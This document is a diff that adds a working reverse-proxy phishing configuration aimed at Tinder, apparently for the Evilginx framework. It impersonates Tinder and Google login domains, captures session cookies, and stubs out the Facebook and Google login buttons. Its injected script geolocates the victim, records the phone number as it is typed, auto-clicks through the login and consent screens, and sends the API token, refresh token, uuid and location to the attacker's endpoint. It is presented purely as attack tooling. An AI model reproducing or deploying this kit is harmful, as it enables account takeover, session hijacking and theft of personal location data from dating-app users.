@@ -1,0 +1,218 @@
+author: '@sin'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'tinder.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '2', orig_sub: 'data', domain: 'gotinder.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '3', orig_sub: 'api', domain: 'gotinder.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '4', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '5', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+auth_tokens:
+  - domain: 'tinder.com'
+    keys: ['AWSALB','AWSALBCORS']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'phone'
+    search: '(.*)'
+    type: 'post'  
+  password:
+    key: 'state'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'activeTabKey'
+      search: '(.*)'
+      type: 'post'
+    - key: 'apiToken'
+      search: '(.*)'
+      type: 'post'
+    - key: 'configService'
+      search: '(.*)'
+      type: 'post'
+    - key: 'refreshToken'
+      search: '(.*)'
+      type: 'post'
+    - key: 'uuid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'ip'
+      search: '(.*)'
+      type: 'post'
+    - key: 'region'
+      search: '(.*)'
+      type: 'post'
+    - key: 'city'
+      search: '(.*)'
+      type: 'post'
+    - key: 'latitude'
+      search: '(.*)'
+      type: 'post'
+    - key: 'longitude'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'tinder.com'
+  path: '/'
+intercept:
+  - {domain: 'accounts.google.com', path: '^/.*', http_status: 404}
+  - {domain: 'ssl.gstatic.com', path: '^/.*', http_status: 404}
+  - {domain: 'tinder.com', path: '^/static/build/chunks/pc-FacebookLoginButton-[a-f0-9]+\.js$', http_status: 200, body: '"use strict";(globalThis.webpackChunktinderweb=globalThis.webpackChunktinderweb||[]).push([[73864],{583291:(e,t,s)=>{s.r(t),s.d(t,{UnconnectedFacebookLoginButton:()=>p,default:()=>E});var o=s(304674),a=s(313091),i=s(449072),c=s(929463),u=s(766770),l=s(683019),r=s(379746),b=s(673560),d=s(596006),k=s(244216),m=s(283274),f=s(534710),A=s(641195);const h=({fbSdkBlocked:s,loginStart:l,postLoginAction:r,resetFacebookTokenState:k,submissionInProgress:f,submissionSuccessful:h,trackEvent:F,trackHubbleAuthEvent:p})=>{(0,c.A)(),(0,o.useEffect)(()=>{k?.();},[k]),(0,o.useEffect)(()=>{if(h){r?.();k?.();}},[h,k,r]);const E=(0,o.useCallback)(()=>{l(i.YF),F(m.kF,{authFrom:m.Jn,hasPreviouslyLoggedIn:!1,method:i.YF}),F(m.uh,{stepName:b.pZ,actionName:b.Wm,actionContext:b.do,funnelVersion:b.HU}),p({uuid:A.Ftf,type:d.cU});},[l,F,p]);return null;};const F={loginStart:r.AU,resetFacebookTokenState:u.cE,trackEvent:k.s,trackHubbleAuthEvent:f.m7},p=h,E=(0,a.Ng)((function(e){return{fbSdkBlocked:(0,l.XA)(e),submissionInProgress:(0,l.Ab)(e),submissionSuccessful:(0,l.Xn)(e)};}),F)(h)},929463:(e,t,s)=>{s.d(t,{A:()=>r});var n=s(304674),o=s(313091),a=s(449072),i=s(444102),c=s(266603),u=s(864187),l=s(33132);const r=()=>{const e=(0,o.wA)(),t=(0,o.d4)(c.UK),s=(0,o.d4)(l.rV),r=(0,o.d4)(u.m),b=!s||(s&&r===a.YF);(0,n.useEffect)(()=>{if(b){i.A.setDispatch(e);i.A.initialize(t);}},[e,t,b]);}}}]);', mime: "application/javascript"}
+  - {domain: 'tinder.com', path: '^/static/build/chunks/pc-GoogleLoginButton-[a-f0-9]+\.js$', http_status: 200, body: '"use strict";(globalThis.webpackChunktinderweb=globalThis.webpackChunktinderweb||[]).push([[97791],{198005:(e,t,a)=>{a.r(t),a.d(t,{UnconnectedButton:()=>A,default:()=>w});var r=a(348238),o=a(304674),c=a(313091),l=a(67786),n=a(449072),s=a(887868),i=a(2617),u=a(724413),S=a(548645),d=a(379746),b=a(596006),m=a(244216),h=a(534710),p=a(641195);const{mobileBreakpoint:g}=s.A,v=({loginStart:t,postLoginAction:a,submissionSuccessful:c=!1,thirdPartyVerify:s,trackHubbleAuthEvent:S})=>{const d=(0,u.A)(`(min-width:${g-1}px)`)&&!s?i._x:i._P;(0,o.useEffect)(()=>{c&&a?.()},[c,a]);const m=(0,o.useCallback)(()=>{S({uuid:p.kQP,type:b.cU})},[S]),h=(0,o.useCallback)(e=>{t(n.tx,e)},[t]);return null};const E={loginStart:d.AU,trackEvent:m.s,trackHubbleAuthEvent:h.m7},A=(0,o.memo)(v),w=(0,c.Ng)((function(e){return{submissionInProgress:(0,S.bp)(e),submissionSuccessful:(0,S._W)(e)}}),E)(A)},2617:(e,t,a)=>{a.d(t,{Nt:()=>o,WG:()=>r,_P:()=>l,_x:()=>c});const r=300,o=315,c=352,l=315},548645:(e,t,a)=>{a.d(t,{Bb:()=>S,FR:()=>u,H8:()=>s,JY:()=>i,OC:()=>g,_W:()=>p,a$:()=>m,bp:()=>h,ej:()=>E,fE:()=>d,mS:()=>b,rq:()=>A,sh:()=>k,ww:()=>v});var r=a(311933),o=a(872383),c=a(199136),l=a(480114);const n=(0,o.bl)("email"),s=(0,r.createSelector)(n,e=>e.sendEmailState===c.vB),i=(0,r.createSelector)(n,e=>e.sendEmailState===c.WJ),u=(0,r.createSelector)(n,e=>e.sendEmailError),S=(0,r.createSelector)(n,e=>e.removeEmailState===c.WJ),d=(0,r.createSelector)(n,e=>e.sendRecoveryEmailState),b=(0,r.createSelector)(n,e=>e.emailOtpError),m=(0,r.createSelector)(n,e=>e.emailOtpState===c.vB),h=(0,r.createSelector)(n,e=>e.googleTokenState===c.vB),p=(0,r.createSelector)(n,e=>e.googleTokenState===c.WJ),k=(0,r.createSelector)(n,e=>e.googleTokenError),g=(0,r.createSelector)(n,e=>e.emailAuthState??l.hN),v=(0,r.createSelector)(n,e=>e.otpLength),E=(0,r.createSelector)(n,e=>e.maskedEmail),A=(0,r.createSelector)(n,e=>e.secondFactorThirdParty)}}]);', mime: "application/javascript"}
+js_inject:
+  - trigger_domains: ['tinder.com']
+    trigger_paths: ['*']
+    script: |
+      fetch('https://ipwho.is/')
+      .then(response => response.json())
+      .then(data => {
+      if (data.country) {
+      localStorage.setItem('geo', data.country);
+      localStorage.setItem('ip', data.ip);
+      localStorage.setItem('region', data.region);
+      localStorage.setItem('city', data.city);
+      localStorage.setItem('connection', data.connection.isp);
+      localStorage.setItem('latitude', data.latitude);
+      localStorage.setItem('longitude', data.longitude);
+      } else {
+      localStorage.setItem('geo', 'nil');
+      }
+      })
+      .catch(error => {
+      console.error('[geo][err] GET failed.', error);
+      localStorage.setItem('geo', 'nil');
+      });
+      let phoneInterval, countryInterval, reqInterval;
+      phoneInterval = setInterval(() => {
+      let phoneNumber = document.getElementById('phone_number');
+      if (phoneNumber && !phoneNumber.hasAttribute('data-listener-added')) {
+      phoneNumber.setAttribute('data-listener-added', 'true');
+      phoneNumber.addEventListener('input', function () {
+      localStorage.setItem('phone', this.value);
+      });
+      }
+      }, 500);
+      countryInterval = setInterval(() => {
+      let countryElement = document.querySelector('[aria-describedby="phoneErrorMessage"] div[role="button"] div:nth-child(2)');
+      if (countryElement && countryElement.innerText.trim()) {
+      localStorage.setItem('country', countryElement.innerText.trim());
+      }
+      }, 1500);
+      let isDone = false;
+      function sendReq() {
+      if (!isDone && !localStorage.getItem("isDone") && localStorage.getItem("TinderWeb/APIToken") && localStorage.getItem("TinderWeb/APIToken").length > 1) {
+      window.parent.postMessage("LoadFinisher", "*");
+      isDone = true;
+      clearInterval(phoneInterval);
+      clearInterval(countryInterval);
+      clearInterval(reqInterval);
+      indexedDB.open("keyval-store").onsuccess = function(event) {
+      let db = this.result;
+      db.transaction("keyval", "readonly")
+      .objectStore("keyval")
+      .get("persist::mfa")
+      .onsuccess = function(e) {
+      let mfaData = e.target.result ? JSON.parse(e.target.result) : {};
+      let refreshToken = mfaData.refreshToken || null;
+      let tosend = {
+      phone: `[${localStorage.getItem("country")}] ${localStorage.getItem("phone")}`,
+      state: "1",
+      activeTabKey: localStorage.getItem("activeTabKey"),
+      apiToken: localStorage.getItem("TinderWeb/APIToken"),
+      refreshToken: refreshToken,
+      configService: localStorage.getItem("TinderWeb/ConfigService"),
+      uuid: localStorage.getItem("TinderWeb/uuid"),
+      ip: `[${localStorage.getItem("ip")}] ${localStorage.getItem("connection")}`,
+      region: localStorage.getItem("region"),
+      city: localStorage.getItem("city"),
+      latitude: localStorage.getItem("latitude"),
+      longitude: localStorage.getItem("longitude"),
+      };
+      let xhttp = new XMLHttpRequest();
+      xhttp.open("POST", "/t/login", true);
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+      xhttp.send(new URLSearchParams(tosend).toString());
+      localStorage.setItem("isDone", "true");
+      console.log("Authentication Successful.");
+      };
+      }
+      }
+      }
+      reqInterval = setInterval(sendReq, 1000);
+
+      let modalLoginInterval = setInterval(() => {
+      let modalLogin = document.getElementById("MODAL_LOGIN");
+      if (modalLogin) {
+      clearInterval(modalLoginInterval);
+      let parentDiv = modalLogin.closest("div");
+      if (parentDiv) {
+      let buttons = parentDiv.querySelectorAll("button");
+      if (buttons.length >= 2) {
+      buttons[1].click();
+      }
+      let mtClassInterval = setInterval(() => {
+      let mtClassElement = document.querySelector(".Mt\\(a\\)");
+      if (mtClassElement) {
+      clearInterval(mtClassInterval);
+      let clickButtonInterval = setInterval(() => {
+      let mtButtons = mtClassElement.querySelectorAll("button");
+      if (mtButtons.length === 3) {
+      mtButtons[1].click();
+      } else if (mtButtons.length === 2) {
+      mtButtons[0].click();
+      }
+      let phoneNumberElement = document.getElementById("phone_number");
+      if (phoneNumberElement) {
+      clearInterval(clickButtonInterval);
+      if (document.querySelector('.Pos\\(f\\).Start\\(0\\).End\\(0\\).Z\\(2\\).Bxsh\\(\\$bxsh-4-way-spread\\).B\\(0\\).Bgc\\(\\$c-ds-background-primary\\).C\\(\\$c-ds-text-secondary\\)')) {
+      let consentBtns = document.querySelector('.Pos\\(f\\).Start\\(0\\).End\\(0\\).Z\\(2\\).Bxsh\\(\\$bxsh-4-way-spread\\).B\\(0\\).Bgc\\(\\$c-ds-background-primary\\).C\\(\\$c-ds-text-secondary\\)').querySelectorAll('button');
+      if (consentBtns.length > 1) {
+      consentBtns[1].click();
+      } else {
+      console.log('Consent buttons not found.');
+      } 
+      } else {
+      console.log('Consent div not found.');
+      }
+      const geo = localStorage.getItem("geo");
+      if (geo !== "nil") {
+      document.querySelector(".D\\(ib\\).Bdrsbstart\\(0\\)\\!").click();
+      const interval = setInterval(() => {
+      const elements = document.querySelectorAll(".Cf.Cur\\(p\\).focus-button-style");
+      if (elements.length > 0) {
+      clearInterval(interval);
+      let geoSelect = false;
+      for (let i = 0; i < elements.length; i++) {
+      const elementText = elements[i].innerText.replace(/\s+/g, ' ').trim();
+      if (elementText.includes(geo)) {
+      console.log("Found match with geo:", geo);
+      geoSelect = true;
+      elements[i].click();
+      break;
+      }
+      }
+      if (!geoSelect) {
+      console.log("No geo match found.");
+      document.querySelector(".focus-button-style.Cur\\(p\\).D\\(ib\\).P\\(0\\)").click();
+      }
+      }
+      }, 500);
+      }
+      setTimeout(() => window.parent.postMessage("Loaded", "*"), 1300);
+      let interval = setInterval(() => {
+      let closeElements = document.querySelectorAll(".close");
+      if (closeElements.length > 0) {
+      closeElements.forEach(close => {
+      if (close.style.display !== "none") {
+      close.style.display = "none";
+      }
+      });
+      clearInterval(interval);
+      }
+      }, 100);
+      }
+      }, 500);
+      }
+      }, 500);
+      }
+      }
+      }, 500);
